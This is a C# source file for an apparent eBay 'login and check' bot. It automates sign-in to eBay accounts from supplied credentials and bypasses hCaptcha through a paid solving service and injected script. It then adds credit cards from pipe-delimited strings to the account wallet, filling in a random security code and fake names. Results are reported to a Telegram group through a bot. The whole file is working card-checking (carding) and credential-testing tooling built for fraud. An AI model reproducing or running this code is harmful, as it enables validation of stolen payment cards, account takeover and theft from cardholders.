using ebayLoginAndCheck.Models;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using RestSharp;
using SeleniumExtras.WaitHelpers;
using System.Net;
using TwoCaptcha.Captcha;

namespace ebayLoginAndCheck.Controllers
{
    public class EbayController
    {

        public void randomTime(int min, int max)
        {
            Random random = new Random();
            int rdn = random.Next(min, max);
            Thread.Sleep(rdn * 1000);
        }

        public bool checkLoginEbay(ChromeDriver driver, int min, int max)
        {
            bool isLogin = false;
            try
            {
                IWebElement webElement = null;
                WebDriverWait driverWait = new WebDriverWait(driver, TimeSpan.FromSeconds(10));
                try
                {
                    driverWait.Until(ExpectedConditions.ElementExists(By.XPath("//button[@aria-label='Dismiss this dialog']"))).Click();
                }
                catch { }
                try
                {
                    webElement = driverWait.Until(ExpectedConditions.ElementExists(By.XPath("//button[@id='gh-ug']")));
                    if (webElement != null)
                    {
                        isLogin = true;
                    }
                }
                catch
                {
                    try
                    {
                        webElement = driverWait.Until(ExpectedConditions.ElementExists(By.XPath("//span[@class='gh-ug-guest']")));
                        if (webElement != null)
                        {
                            isLogin = false;
                        }
                    }
                    catch
                    {
                    }
                }

            }
            catch (Exception ex)
            {
            }
            return isLogin;
        }

        public string getResultAddCC(ChromeDriver driver, string ccString)
        {
            try
            {
                string[] ccList = ccString.Split('|');
                WebDriverWait driverWait = new WebDriverWait(driver, TimeSpan.FromSeconds(20));
                driverWait.Until(ExpectedConditions.ElementExists(By.XPath("//span[@class='wallet-option__cell']"))).Click();
                driver.SwitchTo().Frame(driver.FindElement(By.XPath("//iframe[@class='iframe-dialog__iframe']")));
                driverWait.Until(ExpectedConditions.ElementExists(By.Id("payment-option-cc")));
                Thread.Sleep(2000);
                driver.FindElement(By.Id("payment-option-cc")).Click();
                Thread.Sleep(2000);
                driverWait.Until(ExpectedConditions.ElementExists(By.XPath("//a[@aria-label='Continue']"))).Click();
                Thread.Sleep(2000);
                driverWait.Until(ExpectedConditions.ElementExists(By.XPath("//input[@name='creditCardNumber']")));
                Thread.Sleep(2000);
                driver.FindElement(By.XPath("//input[@name='creditCardNumber']")).SendKeys(ccList[0]);
                Thread.Sleep(1000);
                driver.FindElement(By.Name("expirationDate")).SendKeys(ccList[1]);
                Thread.Sleep(500);
                driver.FindElement(By.Name("expirationDate")).SendKeys(ccList[2].Substring(2));
                Thread.Sleep(1000);
                driver.FindElement(By.Name("securityCode")).SendKeys(Faker.RandomNumber.Next(100, 999).ToString());
                Thread.Sleep(1000);
                driver.FindElement(By.Name("firstName")).SendKeys(Faker.Name.First());
                Thread.Sleep(1000);
                driver.FindElement(By.Name("lastName")).SendKeys(Faker.Name.Last());
                Thread.Sleep(1000);
                driverWait.Until(ExpectedConditions.ElementExists(By.XPath("//button[@aria-label='Continue']"))).Click();
                //html/body/div[3]/div/div/div/section/div[2]/p/span/span[1]/span
                try
                {
                    WebDriverWait driverWait1 = new WebDriverWait(driver, TimeSpan.FromSeconds(10));
                    IWebElement webElementError = driverWait1.Until(ExpectedConditions.ElementExists(By.XPath("html/body/div[3]/div/div/div/section/div[2]/p/span/span[1]/span")));
                    if (webElementError != null)
                    {
                        return "CC Failed";
                    }
                }
                catch { }
                driver.SwitchTo().DefaultContent();
                string addCCresult = driverWait.Until(ExpectedConditions.ElementExists(By.XPath("//div[@class='page-notice__main']/p/span/span/span"))).Text;
                if (!string.IsNullOrEmpty(addCCresult))
                {
                    return addCCresult;
                }
                else
                {
                    return null;
                }
            }
            catch (Exception err)
            {
                Console.WriteLine(err.ToString());
                return null;
            }
        }

        public bool loginAccountEbay(ChromeDriver driver, int min, int max, string username, string password, string api)
        {
            try
            {
                WebDriverWait driverWait = new WebDriverWait(driver, TimeSpan.FromSeconds(10));
                driverWait.Until(ExpectedConditions.ElementExists(By.Id("userid"))).SendKeys(username);
                Thread.Sleep(2000);
                driver.FindElement(By.Id("signin-continue-btn")).Click();
                randomTime(min, max);
                driverWait.Until(ExpectedConditions.ElementExists(By.Id("pass"))).SendKeys(password);
                Thread.Sleep(2000);
                driver.FindElement(By.Id("sgnBt")).Click();
                randomTime(min, max);
                try
                {
                    if (driver.Url.Contains("https://www.ebay.com/splashui/captcha?"))
                    {
                        bypassCaptcha(driver, api);
                        driver.SwitchTo().DefaultContent();
                    }
                    
                }
                catch
                {
                    
                }
                try
                {
                    driverWait.Until(ExpectedConditions.ElementExists(By.Id("passkeys-cancel-btn"))).Click();
                }
                catch { }
                if (!driver.Url.Contains("https://accounts.ebay.com/acctxs/stepup"))
                {
                    return true;
                }
                else
                {
                    return false;
                }
                
            }
            catch (Exception err)
            {
                Console.WriteLine(err.ToString());
                return false;
            }

        }

        public bool loginAgainAccountEbay(ChromeDriver driver, int min, int max, string username, string password, string api)
        {
            try
            {
                WebDriverWait driverWait1 = new WebDriverWait(driver, TimeSpan.FromSeconds(10));
                driverWait1.Until(ExpectedConditions.ElementExists(By.Id("userid"))).SendKeys(username);
                Thread.Sleep(2000);
                driver.FindElement(By.Id("signin-continue-btn")).Click();
                randomTime(min, max);
            }
            catch { }
            try
            {
                WebDriverWait driverWait = new WebDriverWait(driver, TimeSpan.FromSeconds(20));
                driverWait.Until(ExpectedConditions.ElementExists(By.Id("pass"))).SendKeys(password);
                Thread.Sleep(2000);
                driver.FindElement(By.Id("sgnBt")).Click();
                randomTime(min, max);
            }
            catch (Exception err)
            {
                Console.WriteLine(err.ToString());
            }
            try
            {
                WebDriverWait driverWait = new WebDriverWait(driver, TimeSpan.FromSeconds(10));
                driverWait.Until(ExpectedConditions.ElementExists(By.Id("passkeys-cancel-btn"))).Click();
            }
            catch { }
            try
            {
                randomTime(min, max);
                IWebElement webElement = driver.FindElement(By.Id("display-nb-welcome-msg"));
                if (webElement != null)
                {
                    return true;
                }
            }
            catch { }
            if (!driver.Url.Contains("https://accounts.ebay.com/acctxs/stepup"))
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public string getCaptchaCode(string api)
        {
            TwoCaptcha.TwoCaptcha solver = new TwoCaptcha.TwoCaptcha(api);
            string codeCaptcha = string.Empty;
            HCaptcha captcha = new HCaptcha();
            captcha.SetSiteKey("195eeb9f-8f50-4a9c-abfc-a78ceaa3cdde");
            captcha.SetUrl("https://www.ebay.com/");
            try
            {
                solver.Solve(captcha).Wait();
                Console.WriteLine("Captcha solved: " + captcha.Code);
                codeCaptcha = captcha.Code;
            }
            catch (AggregateException e)
            {
                Console.WriteLine("Error occurred: " + e.InnerExceptions.First().Message);
            }
            return codeCaptcha;
        }

        public bool bypassCaptcha(ChromeDriver driver, string api)
        {
            string codeCaptcha = getCaptchaCode(api);
            if (!string.IsNullOrEmpty(codeCaptcha))
            {
                try
                {
                    IWebElement cpatcha = driver.FindElement(By.XPath("//iframe[@id='captchaFrame']"));
                    if (cpatcha != null)
                    {
                        driver.SwitchTo().Frame(cpatcha);
                    }
                }
                catch { }
                string idTarget = driver.FindElement(By.XPath("//div[@class='target-icaptcha-slot']")).GetAttribute("id");
                string idInput = idTarget.Split('-')[0] + "-" + idTarget.Split('-')[1] + "-captcha-data";
                string valueInput = driver.FindElement(By.XPath($"//input[@id='{idInput}']")).GetAttribute("value");
                InputValue inputValue = JsonConvert.DeserializeObject<InputValue>(valueInput.Replace("&quot;", "\""));
                CaptchaToken captchaToken = new CaptchaToken();
                long pvt = DateTimeOffset.Now.ToUnixTimeMilliseconds();
                captchaToken.pvt = pvt;
                captchaToken.cvt = pvt + 20;
                captchaToken.crt = (DateTimeOffset.Now + TimeSpan.FromMicroseconds(120)).ToUnixTimeMilliseconds();
                captchaToken.iid = inputValue.iid;
                captchaToken.provider = inputValue.provider;
                captchaToken.guid = inputValue.guid;
                captchaToken.appName = inputValue.appName;
                captchaToken.token = codeCaptcha;
                string captchaTokenInput = Uri.EscapeDataString(JsonConvert.SerializeObject(captchaToken));
                try
                {
                    driver.ExecuteScript($"""
                    document.getElementsByName("g-recaptcha-response")[0].innerHTML = "{codeCaptcha}";
                    document.getElementsByName("h-captcha-response")[0].innerHTML = "{codeCaptcha}";

                    let scr = document.createElement('input');
                    scr.name = 'captchaTokenInput';
                    scr.type = 'hidden';
                    scr.value = "{captchaTokenInput}";
                    document.getElementById('captcha_form').appendChild(scr);

                    let iframes = document.getElementsByTagName("iframe");
                    iframes[1].setAttribute("data-hcaptcha-response", "{codeCaptcha}");

                    captchaCallback(true);
                    """);
                }
                catch { }
                return true;
            }
            else
            {
                return false;
            }
        }

        public async Task<bool> sendCCToTelegram(string apiTelegram, string idGroup, string cc)
        {
            var options = new RestClientOptions("https://api.telegram.org/bot" + apiTelegram + "/sendMessage");
            var client = new RestClient(options);
            var request = new RestRequest();
            request.Method = Method.Post;
            request.AddHeader("Content-Type", "application/json");
            request.RequestFormat = RestSharp.DataFormat.Json;
            TelegramModel telegramModel = new TelegramModel();
            telegramModel.text = cc;
            telegramModel.chat_id = idGroup;
            string rawJson = JsonConvert.SerializeObject(telegramModel);
            request.AddParameter("application/json", rawJson, ParameterType.RequestBody);
            var response = await client.ExecuteAsync(request);
            if (response.StatusCode == HttpStatusCode.OK)
            {
                string jsonContent = response.Content;
                TelegramSendMessage telegramSendMessage = JsonConvert.DeserializeObject<TelegramSendMessage>(jsonContent);
                return telegramSendMessage.ok;
            }
            else
            {
                return false;
            }
        }
    }
}

public class TelegramModel
{
    public string chat_id { get; set; }
    public string text { get; set; }
}

